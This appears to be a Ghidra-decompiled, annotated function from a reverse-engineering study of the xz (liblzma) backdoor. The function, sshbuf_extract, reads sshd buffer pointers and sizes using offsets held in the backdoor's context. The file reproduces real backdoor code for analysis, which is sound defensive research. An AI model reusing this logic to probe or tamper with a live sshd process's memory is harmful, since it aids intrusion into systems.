// /home/kali/xzre-ghidra/xzregh/107950_sshbuf_extract.c
// Function: sshbuf_extract @ 0x107950
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshbuf_extract(sshbuf * buf, global_context_t * ctx, void * * p_sshbuf_d, size_t * p_sshbuf_size)


/*
 * AutoDoc: Reads out an sshbuf’s d pointer and size field using the dynamic layout encoded in global_ctx->sshd_offsets. Depending on
 * whether each qword index is negative it either uses the struct fields directly or walks to the encoded offset, confirms both the
 * struct and the pointed-to range are mapped with is_range_mapped, and hands the caller the live pointer/length pair.
 */

#include "xzre_types.h"

BOOL sshbuf_extract(sshbuf *buf,global_context_t *ctx,void **p_sshbuf_d,size_t *p_sshbuf_size)

{
  byte size_index;
  byte data_index;
  BOOL success;
  ulong size_offset;
  ulong data_offset;
  u64 span;
  u8 *data_ptr;
  
  if (ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  if (((buf != (sshbuf *)0x0) && (p_sshbuf_d != (void **)0x0)) && (p_sshbuf_size != (size_t *)0x0))
  {
    size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
    data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
    if ((char)(size_index & data_index) < '\0') {
      size_offset = 0;
      data_offset = 0;
      span = 0x48;
    }
    else {
      size_offset = (ulong)((int)(char)size_index << 3);
      data_offset = (ulong)((int)(char)data_index << 3);
      span = size_offset + 8;
      if (size_offset < data_offset) {
        span = data_offset + 8;
      }
    }
    success = is_range_mapped((u8 *)buf,span,ctx);
    if (success != FALSE) {
      if (*(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 2) < '\0') {
        data_ptr = buf->d;
      }
      else {
        data_ptr = *(u8 **)((long)&buf->d + data_offset);
      }
      *p_sshbuf_d = data_ptr;
      if (*(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 3) < '\0') {
        span = buf->size;
      }
      else {
        span = *(u64 *)((long)&buf->d + size_offset);
      }
      *p_sshbuf_size = span;
      success = is_range_mapped(data_ptr,span,ctx);
      return (uint)(success != FALSE);
    }
  }
  return FALSE;
}

